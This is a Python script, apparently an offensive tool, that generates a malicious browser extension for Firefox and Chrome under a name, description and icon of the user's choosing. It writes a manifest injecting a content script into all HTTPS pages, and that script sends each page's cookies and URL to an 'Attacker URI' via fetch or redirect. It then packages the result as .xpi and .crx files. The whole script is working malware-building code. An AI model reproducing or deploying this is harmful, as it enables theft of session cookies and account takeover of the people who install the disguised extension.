#!/bin/env python3
#shiky8

import os

add_name = input("Enter the ADD Name : ")
add_description =  input("Enter the ADD description : ")
add_icon = input("Enter the ADD icon : ")
AttackerURI = input("Enter the Attacker URI : ")

popup_ui = input("Enter the ADD POP HTML FILE : ")



os.system('rm src/js/main.js manifest.json output/'+add_name+'.xpi '+'src/js/main.js manifest.json output/'+add_name+'.crx')

manifest = '''{
  "manifest_version": 2,
  "name": "'''+add_name+'''",
  "version": "1.0.0",

  "browser_action": {
    "default_icon": {
      "19": "src/icons/pop_cookie.ico",
      "38": "src/icons/pop_cookie.ico"
    },
    "default_title": "Whereami?",
    "default_popup": "'''+popup_ui+'''"
  },
  "content_security_policy": "script-src 'self' https://example.com; object-src 'self'",

  "description": "'''+add_description+'''",

  "icons": {
    "48": "'''+add_icon+'''"
  },

  "content_scripts": [
    {
      "matches": ["https://*/*","https://*/*/*"],
      "js": ["src/js/main.js"]
    }
  ]
}
'''

# print(manifest)
ManifestFile = open('manifest.json','w')
ManifestFile.write(manifest)
ManifestFile.close()

backend = '''popisHere = sessionStorage.getItem("popisHere"); 
if(popisHere){
console.log("same");
}else{
	sessionStorage.setItem("popisHere", true);
	fetch("'''+AttackerURI+'''/c.php?c="+escape(document.cookie)+"&locat="+document.location.href)
	  .then(response => {
	    if (response.ok) {
	      console.log('Website loaded successfully');
	    } else {
	      location.href="'''+AttackerURI+'''/c.php?c="+escape(document.cookie)+"&locat="+document.location.href;
	      // Add your series of steps here for handling the error
	    }
	  })
	  .catch(error => {
	    location.href="'''+AttackerURI+'''/c.php?c="+escape(document.cookie)+"&locat="+document.location.href;
	    // Add your series of steps here for handling the error
	  });
}

'''
# print(backend)
BackendFile = open('src/js/main.js','w')
BackendFile.write(backend)
BackendFile.close()

choise = int(input("for firefox and chrome Enter: 1\nfor chrome Enter:2\nfor firefox Enter: 3\n "))

# choise = 2
if choise == 1:
	os.system('7z a -tzip -mx9 output/'+add_name+'.xpi manifest.json src/js/main.js  '+add_icon)

	os.system('7z a -tzip -mx9 output/'+add_name+'.crx manifest.json src/js/main.js  '+add_icon)
	print("done check output/"+add_name+".crx output/"+add_name+".xpi")
elif choise == 2:
	os.system('7z a -tzip -mx9 output/'+add_name+'.crx manifest.json src/js/main.js  '+add_icon)
	print("done check output/"+add_name+".crx")
else:
	os.system('7z a -tzip -mx9 output/'+add_name+'.xpi manifest.json src/js/main.js  '+add_icon)
	print("done check output/"+add_name+".xpi")
